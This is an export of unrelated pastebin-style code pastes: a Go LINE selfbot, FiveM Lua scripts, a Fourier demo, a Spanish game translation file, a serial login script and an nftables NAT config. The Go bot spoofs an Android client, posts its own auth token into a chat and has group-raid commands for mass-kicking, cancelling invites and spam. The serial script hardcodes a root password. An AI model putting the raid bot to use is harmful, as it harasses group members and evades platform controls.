id,title,username,language,date,content
Q4VDzBNr,main/go1,kohpriwniranam,Go,Friday 8th of September 2023 11:52:19 PM CDT,"//==================//
func main(){
	rand.Seed(time.Now().UTC().UnixNano())
	cpu = runtime.NumCPU()
	CheckExprd()
	filepath := fmt.Sprintf(""token/%s.txt"", name)
	b, err := ioutil.ReadFile(filepath)
	if err != nil {
		fmt.Print(err)
	}
	token := string(b)//;df := randomString(1);ds := randomString(1);dx := randomString(1);dz := randomString(1)
	r1 := randomStringAlphabet(2)
	r2 := randomStringAlphabet(1)
	r3 := randomStringLetter(5)
	r4 := randomStringAlphabet(1)
	var AppName = fmt.Sprintf(""ANDROID\t2.%v.%v\tAndroid OS\t10.%s.%s"", r1,r2,r3,r4)
	var UserAgent = fmt.Sprintf(""LLA/2.%v.%v SM-J320G 10.%s.%s"", r1,r2,r3,r4)
	LINE_APPLICATION = AppName
	USER_AGENT = UserAgent
	LoginWithAuthToken(token)
	result := "" ☘️  𝗕𝗢𝗧 𝗜𝗡𝗙𝗢  ☘️""+""\n\n""
	result += "" 🧭  Version: ""+versions+""\n""
	result += "" 🧭  Revised: ""+Revised+""\n""
	result += "" 🧭  AppName: ""+AppName+""\n""
	result += "" 🧭  UserAgent: ""+UserAgent+""\n""
	result += "" 🧭  ToKen: \n""+token+""\n""
	SendText(E2EE_Golang, result, 0)	
	RemoveLeterSelling()
	line := new(LINEBOTS)
	readJs := fmt.Sprintf(""db/%s.json"", name)
	file, err := ioutil.ReadFile(readJs)
	if err != nil {		
		line.data = &User{
			Creator:        []string{""u4f277756fcca495d02e3292e317bec8b"",""uf17ac0aaec776a55460f0e50fa78fe61"",""u96f77decf42e3598ffdac8770787f946""},
			Master:         []string{""u4f277756fcca495d02e3292e317bec8b"",""uf17ac0aaec776a55460f0e50fa78fe61"",""u96f77decf42e3598ffdac8770787f946""},
			ArgSname:       ""?"",
			Logo:			"" 𝗡𝗶𝗿𝗮𝗻𝗮𝗺™ 𝗕𝗼𝘁𝘀"",
			Idlink:			""http://line.me/ti/p/~@665xovul"",
			Giftlink:""https://media2.giphy.com/media/3o7btMotAhVnUOz2Mg/giphy.gif?cid=6c09b9521a634e84ac12ebac149c10f8885eeba2644fbb29&rid=giphy.gif&ct=g"",			
			Owner:          []string{},
			Admins:         []string{},
			Squad:          []string{},			
			Gowner:         mygowner,
			Gadmin:         mygadmin,			
			Gstaff:         mygstaff,
			Staylist:       groupLock,
			ProName:		proName,
			WarKill:		warKill,
			Gname:		    saveGname,
			Gticket:		groupLink,
			ListBlacks:		blacks,
			Unlucklist:		[]string{},
			MessageSpam:	SpamMsg,
			WarsQrkill: 	warsqrkill,						
			Bots:           []string{},
			Sq:             []string{},
			Antijs:         []string{},
			ProQR:          []string{},					
			ProInvite:      []string{},
			ProKick:        []string{},
			ProCancel:      []string{},			
			ProJoin:        []string{},
			ProCallmedia:   []string{},
			ProCallvideo:   []string{},			
			ProShare:       []string{},
			ProDelalbum:    []string{},	
			ProNote:        []string{},
			ProAlbum:       []string{},		
			ProSendcontact: []string{},
			ProAnyurl:      []string{},
			ProFlex:        []string{},			
			Wban:           []string{""https://"", ""http://"", ""line://"", "".com"", "".vip"", "".net""},
			Banned: 		[]string{},
			Banmid: 		[]string{},
			Canban: 		true,			
			FastCans:       false,
			BackupMem:      false,
			Modebackup:     true,
			Modeajs:        false,
			AutoBL:         false,			
			ForceINV:       false,
			ForceCan:       false,			
			AutoCN:         false,			
			Antitag:        false,
			Promotebans:    false,
			Demotebans:     false,			
			Nukick:         false,
			Nucancel:       false,
			ByeMem:         false,
			Silent:         false,
			Responkick:     ""_╭∩╮(ಠ_ಠ)╭∩╮_"",
			Team:           ""N̶i̶r̶a̶n̶a̶m̶ B̶o̶t̶s̶"",			
			KickBan:        false,
			Limiter:        []string{},			
			Kickall:        ""byeall"",
			Bypass:         ""cleanall"",
			Cancelall:      ""cansall"",
			Kickmem:        ""tap"",
			Chokdi:         "" goodluck"",
			Symbologo:      ""ηιяα_ηαм™ ᴮᴼᵀ"",
			Sett:           ""settings"",
			Tag:            ""mentions"",
			Clearban:       ""unban"",
		}
		b, _ := json.MarshalIndent(line.data, """", ""   "")
		_ = ioutil.WriteFile(readJs, b, 0644)//1024
	} else {
		line.data = new(User)
		_ = json.Unmarshal([]byte(file), &line.data)
	}
	for {
		fetch := RealFetchOps()
		if len(fetch) > 0 {
			ops := fetch[0]
			if ops.Type != 26 {
				if line.data.Modeajs == true {
					runtime.GOMAXPROCS(cpu)
					go func(){
						line.Majs(ops)
					}()
				}else if line.data.Modebackup == true {
					runtime.GOMAXPROCS(100)
					if ops.Type == 11 || ops.Type == 122 {
						runtime.GOMAXPROCS(100)
						go func(){line.NotifUpdate(ops)}()
					} else if ops.Type == 15 {
						runtime.GOMAXPROCS(100)
						go func(){line.NotifLeave(ops)}()
					} else if  ops.Type == 16 || ops.Type == 129 {
						runtime.GOMAXPROCS(100)
						go func(){line.NotifAcceptinv(ops)}()
					} else if ops.Type == 12 || ops.Type == 123 {
						runtime.GOMAXPROCS(100)
						go func(){line.NotifInviteIntoGroup(ops)}()
					} else if ops.Type == 31 || ops.Type == 125 {
						runtime.GOMAXPROCS(100)
						go func(){line.NotifCountCancel(ops)}()
					} else if ops.Type == 32 || ops.Type == 126 {
						runtime.GOMAXPROCS(100)
						go func(){line.NotifCancel(ops)}()
					} else if ops.Type == 13 || ops.Type == 124 {
						runtime.GOMAXPROCS(100)
						go func(){line.NotifInvite(ops)}()
					} else if ops.Type == 14 || ops.Type == 12 {
						runtime.GOMAXPROCS(100)
						go func(){line.NotifCInvite(ops)}()
					} else if ops.Type == 17 || ops.Type == 130 {
						runtime.GOMAXPROCS(100)
						go func(){line.NotifJoin(ops)}()
					} else if ops.Type == 18 || ops.Type == 132 {
						runtime.GOMAXPROCS(100)
						go func(){line.NotifCCountKick(ops)}()
					} else if ops.Type == 19 || ops.Type == 133 {
						runtime.GOMAXPROCS(100)
						go func(){line.NotifKick(ops)}()
					} else if ops.Type == 55 {
						runtime.GOMAXPROCS(100)
						go func(){line.NotifRead(ops)}()
					}
				}							
			}else {
				go func(){
					line.Comand(ops)
				}()
			}
		}
		go func() {
			b, _ := json.MarshalIndent(line.data, """", ""    "")
			_ = ioutil.WriteFile(readJs, b, 0644)//1024
		}()
	}
}"
L6RTStgr,sreg,TwizzyIndy,JSON,Friday 8th of September 2023 11:42:00 PM CDT,"{
    ""last_version"" : 1.00,
    ""force_update"" : true,
    ""url"" : ""https://drive.google.com/file/d/10D1wIH28zDyfDVMP4cvoHr1z-Mjbb5rv/view?usp=sharing"",
    ""emergency_force_close"": false,
    ""force_close_message"" : ""Server Maintenance"",
    ""blacklist"" : []
}"
5RXrmnWi,Excel NoneType,theguild42,Python,Friday 8th of September 2023 10:56:52 PM CDT,"def X(value):
    if value == ""x"":
        str(""Condition Passed!"")
    else:
        str(""Condition Failed!"")

type(X('x'))"
JrEwz5x7,anti jump when you have gun,MadDevil,Lua,Friday 8th of September 2023 10:39:01 PM CDT,"-- anti jump when you have gun in your hand

Citizen.CreateThread(function()
    while true do
        Citizen.Wait(5)
        if IsPedArmed(GetPlayerPed(-1), 4 | 2) then 
            DisableControlAction(0, 22, true)
        end
    end
end)"
YfpDgjj3,anti car roll,MadDevil,Lua,Friday 8th of September 2023 10:37:45 PM CDT,"-- anti car roll

local vehicleClassDisableControl = {
    [0] = true, --compacts
    [1] = true, --sedans
    [2] = true, --SUV's
    [3] = true, --coupes
    [4] = true, --muscle
    [5] = true, --sport classic
    [6] = true, --sport
    [7] = true, --super
    [8] = false, --motorcycle
    [9] = true, --offroad
    [10] = true, --industrial
    [11] = true, --utility
    [12] = true, --vans
    [13] = false, --bicycles
    [14] = false, --boats
    [15] = false, --helicopter
    [16] = false, --plane
    [17] = true, --service
    [18] = true, --emergency
    [19] = false --military
}

CreateThread(function()
    while true do

    Wait(0)
        local player = PlayerPedId()
        local vehicle = GetVehiclePedIsIn(player, false)
        if not vehicle then
            Wait(1500)
        else

            local vehicleClass = GetVehicleClass(vehicle)
            if ((GetPedInVehicleSeat(vehicle, -1) == player) and vehicleClassDisableControl[vehicleClass]) then
                if IsEntityInAir(vehicle) then
                    DisableControlAction(2, 59)
                    DisableControlAction(2, 60)
                else
                    Wait(100)
                end
            else
                Wait(1500)
            end
        end
    end
end)

"
7fSVetyk,# fast_fourier_transform.py,here2share,Python,Friday 8th of September 2023 09:23:36 PM CDT,"# fast_fourier_transform.py

import cmath
import random
		
# Test example
wavelets = 1000 # the more wavelets makes for precision
signal = [random.randint(0, 256) for _ in range(wavelets)]
print(signal, end='\n\n\n')

def DFT(x):
	N = len(x)
	return [sum((x[n]*cmath.exp(-2j*cmath.pi*k*n/N) for n in range(N))) for k in range(N)]

def fast_fourier_transform(signal):
	# Perform the Fourier transform
	transformed_signal = DFT(signal)
	
	print(transformed_signal[:20], end='\n\n\n')
	
	N = len(transformed_signal)
	for i in range(len(signal)):
		# Perform the inverse Fourier transform
		sum_of_wavelets = sum((transformed_signal[k]*cmath.exp(2j*cmath.pi*k*i/N) for k in range(N)))
		sum_of_wavelets = round(sum_of_wavelets.real) // 1000
		valid = sum_of_wavelets == signal[i]
		oops = ''
		if not valid:
			oops = '!' * 20 + ' '
		print(f'{oops}sum_of_wavelets: {sum_of_wavelets} == signal[{i}]: {signal[i]} is {valid}')

fast_fourier_transform(signal)"
jMgKkqr7,Battle Master Maneuver Fixes Spanish Translation,H4wK32,XML,Friday 8th of September 2023 09:11:06 PM CDT,"<?xml version=""1.0"" encoding=""utf-8""?>
<contentList>
	<content contentuid=""h0ccd87c9gddecg468dg91b1g32b6674ab58c"" version=""1"">Puedes renunciar a uno de tus ataques y usar tu &lt;LSTag Type=""ActionResource"" Tooltip=""BonusActionPoint""&gt;acción adicional&lt;/LSTag&gt; para ordenar a uno de tus compañeros que ataque. Cuando lo haces, elige una criatura amistosa que pueda verte o escucharte y gasta un &lt;LSTag Type=""ActionResource"" Tooltip=""SuperiorityDie""&gt;dado de supremacía&lt;/LSTag&gt;. Dicha criatura podrá, en ese mismo instante, usar su &lt;LSTag Type=""ActionResource"" Tooltip=""ReactionActionPoint""&gt;reacción&lt;/LSTag&gt; para realizar un ataque con arma, añadiendo [1] a la tirada de daño de su ataque.</content>
	<content contentuid=""h6a4ef5fcg2be0g4d2egbfd9g9a6a9ef0e31c"" version=""1"">Cuando golpeas a una criatura con un ataque con arma, puedes gastar un &lt;LSTag Type=""ActionResource"" Tooltip=""SuperiorityDie""&gt;dado de supremacía&lt;/LSTag&gt; para intentar &lt;LSTag Type=""Status"" Tooltip=""DISARMED""&gt;desarmar&lt;/LSTag&gt; al objetivo, forzándole a soltar el arma que está sosteniendo. Añades [1] a la tirada de daño del ataque y el objetivo tiene que realizar una &lt;LSTag Tooltip=""SavingThrow""&gt;tirada de salvación&lt;/LSTag&gt; de Fuerza. Si falla, deja caer su arma a sus pies.</content>
	<content contentuid=""hde6f8c27g7e6ag4bd2g9227g500da5def8f0"" version=""1"">Cuando golpeas a una criatura con un ataque con arma, puedes gastar un &lt;LSTag Type=""ActionResource"" Tooltip=""SuperiorityDie""&gt;dado de supremacía&lt;/LSTag&gt; para distraer a una criatura, dando a tus aliados una oportunidad de atacarla. Añades [1] a la tirada de daño del ataque y la siguiente tirada de ataque contra el objetivo, hecha por cualquiera que no seas tú, tiene &lt;LSTag Tooltip=""Advantage""&gt;ventaja&lt;/LSTag&gt; siempre y cuando se realice antes de que empiece tu siguiente turno.</content>
	<content contentuid=""h595df29bge389g43feg82aeg6efe2b54505e"" version=""1"">Puedes gastar un &lt;LSTag Type=""ActionResource"" Tooltip=""SuperiorityDie""&gt;dado de supremacía&lt;/LSTag&gt; para imponer &lt;LSTag Tooltip=""Disadvantage""&gt;desventaja&lt;/LSTag&gt; a los ataques entrantes hasta el comienzo de tu siguiente turno.</content>
	<content contentuid=""h3e87bc2ag9b46g4575gae56gc41caba11451"" version=""1"">Puedes gastar un &lt;LSTag Type=""ActionResource"" Tooltip=""SuperiorityDie""&gt;dado de supremacía&lt;/LSTag&gt; y usar una &lt;LSTag Type=""ActionResource"" Tooltip=""BonusActionPoint""&gt;acción adicional&lt;/LSTag&gt; en tu turno para realizar una finta a un objetivo. Tienes &lt;LSTag Tooltip=""Advantage""&gt;ventaja&lt;/LSTag&gt; en tu siguiente tirada de ataque contra dicho objetivo. Si este ataque impacta, añades [1] a la tirada de daño del ataque.</content>
	<content contentuid=""h6c2b967dge633g4b65gb489g55dd8c9632e0"" version=""1"">Cuando golpeas a una criatura con un ataque con arma, puedes gastar un &lt;LSTag Type=""ActionResource"" Tooltip=""SuperiorityDie""&gt;dado de supremacía&lt;/LSTag&gt; para intentar provocar al objetivo para que te ataque. Añades [1] a la tirada de daño del ataque y el objetivo debe hacer una &lt;LSTag Tooltip=""SavingThrow""&gt;tirada de salvación&lt;/LSTag&gt; de Sabiduría. Si falla, el objetivo tiene &lt;LSTag Tooltip=""Disadvantage""&gt;desventaja&lt;/LSTag&gt; en todas las tiradas de ataque contra cualquier objetivo que no seas tú hasta el final de tu siguiente turno.</content>
	<content contentuid=""h08251137g0cd4g47a5g8882gf34f4d1472ef"" version=""1"">Cuando golpeas a una criatura con un ataque con arma, puedes gastar un &lt;LSTag Type=""ActionResource"" Tooltip=""SuperiorityDie""&gt;dado de supremacía&lt;/LSTag&gt; para permitir a uno de tus compañeros maniobrar hacia una posición más ventajosa. Añades [1] a la tirada de daño del ataque y elige a una criatura amistosa que pueda verte o escucharte. Dicha criatura ganará la mitad de su velocidad y no provocará &lt;LSTag Tooltip=""OpportunityAttack""&gt;ataques de oportunidad&lt;/LSTag&gt; este turno.</content>
	<content contentuid=""h940ef2c5g5cdfg4256g896dg8d59104f9223"" version=""1"">Cuando golpeas a una criatura con un ataque con arma, puedes gastar un &lt;LSTag Type=""ActionResource"" Tooltip=""SuperiorityDie""&gt;dado de supremacía&lt;/LSTag&gt; para intentar asustar al objetivo. Añades [1] a la tirada de daño del ataque y el objetivo debe hacer una &lt;LSTag Tooltip=""SavingThrow""&gt;tirada de salvación&lt;/LSTag&gt; de Sabiduría. Si falla, estará &lt;LSTag Type=""Status"" Tooltip=""FRIGHTENED""&gt;asustado&lt;/LSTag&gt; hasta el final de tu próximo turno.</content>
	<content contentuid=""hf16176b7gf4acg4a3eg89e2gf818595ff7c4"" version=""1"">Cuando otra criatura te cause daño con un ataque cuerpo a cuerpo, puedes usar tu &lt;LSTag Type=""ActionResource"" Tooltip=""ReactionActionPoint""&gt;reacción&lt;/LSTag&gt; y gastar un &lt;LSTag Type=""ActionResource"" Tooltip=""SuperiorityDie""&gt;dado de supremacía&lt;/LSTag&gt; para reducir el daño en [1] + más tu modificador de Destreza.</content>
	<content contentuid=""h7a8de976g7c2eg4b22g897cg863bdbee902c"" version=""1"">Cuando haces una tirada de ataque con arma contra una criatura, puedes gastar un &lt;LSTag Type=""ActionResource"" Tooltip=""SuperiorityDie""&gt;dado de supremacía&lt;/LSTag&gt; para añadirlo a la tirada. Puedes utilizar esta maniobra antes o después de hacer la tirada de ataque, pero antes de que se aplique cualquier de efecto del ataque.</content>
	<content contentuid=""h46c09435g522fg470agbc45g224b4b51d766"" version=""1"">Cuando golpeas a una criatura con un ataque con arma, puedes gastar un &lt;LSTag Type=""ActionResource"" Tooltip=""SuperiorityDie""&gt;dado de supremacía&lt;/LSTag&gt; para intentar hacer retroceder al objetivo. Añades [1] a la tirada de daño del ataque y, si el objetivo es Grande o más pequeño, debe realizar una &lt;LSTag Tooltip=""SavingThrow""&gt;tirada de salvación&lt;/LSTag&gt; de Fuerza. Si falla, le empujas [2].</content>
	<content contentuid=""h053d2bb3g9903g4e0fg9179gd465648f3b29"" version=""1"">En tu turno, puedes usar una &lt;LSTag Type=""ActionResource"" Tooltip=""BonusActionPoint""&gt;acción adicional&lt;/LSTag&gt; y gastar un &lt;LSTag Type=""ActionResource"" Tooltip=""SuperiorityDie""&gt;dado de supremacía&lt;/LSTag&gt; para reforzar la determinación de uno de tus compañeros. Cuando lo haces, elige una criatura amistosa que pueda verte o escucharte. Dicha criatura obtiene tantos puntos de golpe temporales igual a 6 + tu modificador de Carisma.</content>
	<content contentuid=""h86132520gc90eg4810ga533g7f175f93e4da"" version=""1"">Cuando una criatura falle al intentar atacarte cuerpo a cuerpo, puedes usar tu &lt;LSTag Type=""ActionResource"" Tooltip=""ReactionActionPoint""&gt;reacción&lt;/LSTag&gt; y gastar un &lt;LSTag Type=""ActionResource"" Tooltip=""SuperiorityDie""&gt;dado de supremacía&lt;/LSTag&gt; para hacer un ataque con arma cuerpo a cuerpo contra dicha criatura. Si impactas, añades [1] a la tirada de daño del ataque.</content>
	<content contentuid=""hee0f14bbg598eg4519g8391gdb51ca050230"" version=""1"">Cuando golpeas a una criatura con un ataque con arma cuerpo a cuerpo, puedes gastar un &lt;LSTag Type=""ActionResource"" Tooltip=""SuperiorityDie""&gt;dado de supremacía&lt;/LSTag&gt; para mover tu arma en un arco amplio, causando [1] de daño a tu objetivo y a otro objetivo que esté a [2] o menos del objetivo original y que esté dentro de tu alcance. El tipo de daño es el mismo que el causado por el ataque original.</content>
	<content contentuid=""h0313783agdf82g45f5g81f0g93ad8d377211"" version=""1"">Cuando golpeas a una criatura con un ataque con arma, puedes gastar un &lt;LSTag Type=""ActionResource"" Tooltip=""SuperiorityDie""&gt;dado de supremacía&lt;/LSTag&gt; para intentar derribar al objetivo. Añades [1] a la tirada de daño del ataque y, si el objetivo es Grande or más pequeño, debe hacer una &lt;LSTag Tooltip=""SavingThrow""&gt;tirada de salvación&lt;/LSTag&gt; de Fuerza. Si falla, es &lt;LSTag Type=""Status"" Tooltip=""PRONE""&gt;derribado&lt;/LSTag&gt;.</content>
	<content contentuid=""h0611fcecg07beg4d03g9e30ga410220495c2"" version=""1"">Gasta un &lt;LSTag Type=""ActionResource"" Tooltip=""SuperiorityDie""&gt;dado de supremacía&lt;/LSTag&gt; para causar [1] de daño adicional y posiblemente forzar al objetivo a soltar las armas que está sosteniendo.</content>
	<content contentuid=""h539a6f51g7d30g445bg85d9gd722b8c47f3b"" version=""1"">Gasta un &lt;LSTag Type=""ActionResource"" Tooltip=""SuperiorityDie""&gt;dado de supremacía&lt;/LSTag&gt; para causar [1] de daño adicional y dar al siguiente atacante cualquiera que no seas tú &lt;LSTag Tooltip=""Advantage""&gt;ventaja&lt;/LSTag&gt; contra tu objetivo.</content>
	<content contentuid=""hc8bc6fafg80d5g40bfgb7cdg944cd9fdac65"" version=""1"">Gasta un &lt;LSTag Type=""ActionResource"" Tooltip=""SuperiorityDie""&gt;dado de supremacía&lt;/LSTag&gt; para causar [1] de daño adicional e intentar provocar al objetivo para que te ataque, imponiendo &lt;LSTag Tooltip=""Disadvantage""&gt;desventaja&lt;/LSTag&gt; en todas las tiradas de ataque contra cualquier objetivo que no seas tú hasta el final de tu siguiente turno.</content>
	<content contentuid=""ha241a5feg3f76g4e1bg8757gc7ee95e942e7"" version=""1"">Gasta un &lt;LSTag Type=""ActionResource"" Tooltip=""SuperiorityDie""&gt;dado de supremacía&lt;/LSTag&gt; para causar [1] de daño adicional y permitir a uno de tus compañeros maniobrar hacia una posición más ventajosa cuando golpeas con un ataque</content>
	<content contentuid=""h090b564dgb2e6g4110g909dgff83cb0518d2"" version=""1"">Gasta un &lt;LSTag Type=""ActionResource"" Tooltip=""SuperiorityDie""&gt;dado de supremacía&lt;/LSTag&gt; para causar un [1] de daño adicional e intentar &lt;LSTag Type=""Status"" Tooltip=""FRIGHTENED""&gt;asustar&lt;/LSTag&gt; a tu objetivo.</content>
	<content contentuid=""hdacbaa80g08acg4717g992dgf59f1397bcd6"" version=""1"">Usa tu &lt;LSTag Type=""ActionResource"" Tooltip=""ReactionActionPoint""&gt;reacción&lt;/LSTag&gt; y gasta un &lt;LSTag Type=""ActionResource"" Tooltip=""SuperiorityDie""&gt;dado de supremacía&lt;/LSTag&gt; para reducir el daño entrante en [1].</content>
	<content contentuid=""ha17ef7f6g2048g4cd6ga0e4gcf3fc6f681d5"" version=""1"">Gasta un &lt;LSTag Type=""ActionResource"" Tooltip=""SuperiorityDie""&gt;dado de supremacía&lt;/LSTag&gt; para incrementar la tirada de ataque en [1].</content>
	<content contentuid=""he647145fg8ffag4d0cg8f12ge33e9a7ac96b"" version=""1"">Gasta un &lt;LSTag Type=""ActionResource"" Tooltip=""SuperiorityDie""&gt;dado de supremacía&lt;/LSTag&gt; para causar [1] de daño adicional e intentar hacer retroceder a tu objetivo [1].</content>
	<content contentuid=""h5bbd58bfgb344g45b0gbf84g891a8715e534"" version=""1"">Usa tu &lt;LSTag Type=""ActionResource"" Tooltip=""ReactionActionPoint""&gt;reacción&lt;/LSTag&gt; y gasta un &lt;LSTag Type=""ActionResource"" Tooltip=""SuperiorityDie""&gt;dado de supremacía&lt;/LSTag&gt; para realizar una ataque con arma cuerpo a cuerpo contra tu atacante y causar [1] de daño adicional.</content>
	<content contentuid=""ha8b1ee26g3400g4d76g90fcg37b38e627440"" version=""1"">Gasta un &lt;LSTag Type=""ActionResource"" Tooltip=""SuperiorityDie""&gt;dado de supremacía&lt;/LSTag&gt; para causar [1] de daño adicional a tu objetivo y a otro objetivo que esté a [1] o menos del objetivo original y que esté dentro de tu alcance.</content>
	<content contentuid=""h5fe7ae25g59c4g403ag9cc1gc30f59883a5a"" version=""1"">Gasta un &lt;LSTag Type=""ActionResource"" Tooltip=""SuperiorityDie""&gt;dado de supremacía&lt;/LSTag&gt; para causar un [1] de daño adicional e intentar hacer tropezar a tu objetivo, dejándolo &lt;LSTag Type=""Status"" Tooltip=""PRONE""&gt;derribado&lt;/LSTag&gt;.</content>
	<content contentuid=""hf938e6e5g4517g4bbdgb283g0eaef6464072"" version=""1"">Ataca a un enemigo. Si aciertas, puedes otorgarle a un aliado velocidad de movimiento adicional.</content>
	<content contentuid=""h57e0864fg8f79g4f84g80c9g43d9c01d5119"" version=""1"">Continuación de Ataque de barrido</content>
	<content contentuid=""h4502ad1bgfc8fg4b87gb32ag7436cc7beab1"" version=""1"">Usa el impulso de tu ataque anterior para mover tu arma en un arco rápido y amplio e infligir [1] de daño a otra criatura cercana.</content>
	<content contentuid=""h5f0b505egfee4g41edg8c75g11cda6047e5b"" version=""1"">Continuación de Ataque de barrido lista!</content>
	<content contentuid=""h4273abaegf2a3g4483gad44g90f54fddba17"" version=""1"">&lt;LSTag Type=""Spell"" Tooltip=""Target_SweepingFollowUp""&gt;Continuación de Ataque de barrido&lt;/LSTag&gt; está disponible en tu barra de hechizos temporales!</content>
	<content contentuid=""h7fc5f350gb526g43a1g95ffg3a4707d047ba"" version=""1"">Objetivo de Ataque de barrido</content>
	<content contentuid=""hb831a31egf61fg4014gbfc9ge5d28e55371d"" version=""1"">Este enemigo es un objetivo válido para tu &lt;LSTag Type=""Spell"" Tooltip=""Target_SweepingFollowUp""&gt;Continuación de Ataque de barrido&lt;/LSTag&gt;.</content>
	<content contentuid=""hc8921343gb948g4fc2g95c2g3b0c2d12293c"" version=""1"">Maniobra de Combate (Arrojadiza)</content>
	<content contentuid=""h2c15b74bg4d88g46begb0a1gf3a9ecc97ab3"" version=""1"">Ataque y desarme (Arrojadiza)</content>
	<content contentuid=""h1d6a960ag984bg4c4agb9d1g56db14c7c32c"" version=""1"">Ataque y distracción (Arrojadiza)</content>
	<content contentuid=""h94cf30c6g376fg4064g92fbg6272dddc84d6"" version=""1"">Ataque provocador (Arrojadiza)</content>
	<content contentuid=""h4c00e9b5gebe2g4b78gbfb9g9e0362960fda"" version=""1"">Ataque con maniobra (Arrojadiza)</content>
	<content contentuid=""hc58d7e5dgcbb5g42fdg9b96g81644ce6e145"" version=""1"">Ataque amenazador (Arrojadiza)</content>
	<content contentuid=""hedbb955fgd76fg4ce5g9156gd920fe3adcfa"" version=""1"">Ataque y empujón (Arrojadiza)</content>
	<content contentuid=""ha989d686gf885g46f0g9a86g6b6aa225cc4a"" version=""1"">Ataque y derribo (Arrojadiza)</content>
</contentList>"
cMNfBCBq,ts7600LoginScript,j0h,Python,Friday 8th of September 2023 08:51:04 PM CDT,"#!/usr/bin/env python3
import serial
import time

# Configuration
port = ""/dev/ttyUSB0""
baudrate = 115200
login_prompt = ""ts7600-4a9f81 login:""
password_prompt = ""Password:""
success_prompt = ""root@ts7600-4a9f81:~#""
commands = [""uname -a""]

# Open the serial port
ser = serial.Serial(port, baudrate, timeout=1)

def send_command(command, prompt):
    ser.write(command.encode('utf-8') + b'\n')
    ser.flush()
    while True:
        response = ser.readline().decode('utf-8')
        print(response, end='')
        if prompt in response:
            break

try:
    # Wait for the ""login:"" prompt
    send_command('', login_prompt)

    # Enter the username
    ser.write(""root\n"".encode('utf-8'))

    # Wait for the ""Password:"" prompt
    send_command('', password_prompt)

    # Enter the password
    ser.write(""asd123\n"".encode('utf-8'))

    # Check for successful login
    response = ser.readline().decode('utf-8')
    if success_prompt not in response:
        print(""Login failed."")
        ser.close()
    else:
        print(""Login successful."")

        # Execute commands
        for command in commands:
            send_command(command, success_prompt)

    # Close the serial port
    ser.close()

except serial.SerialException as e:
    print(""Error: "", e)

"
6DCNRVz8,nftables.conf,tferreira,Bash,Friday 8th of September 2023 08:44:55 PM CDT,"#!/usr/sbin/nft -f

flush ruleset

table inet filter {
        chain input {
                type filter hook input priority filter;
        }
        chain forward {
                type filter hook forward priority filter;
        }
        chain output {
                type filter hook output priority filter;
        }
}


table ip nat {
    chain prerouting {
        type nat hook prerouting priority 0; policy accept;
        tcp dport 2222 dnat to 192.168.200.3:22
        tcp dport 3389 dnat to 192.168.200.2:3389
        tcp dport 80 dnat to 192.168.200.3:80
    }

    chain postrouting {
        type nat hook postrouting priority 100; policy accept;
        oifname ""ens35"" masquerade;
    }
}
"
MGf1D4XG,132,Damonwei,JSON,Friday 8th of September 2023 07:19:27 PM CDT,13213231
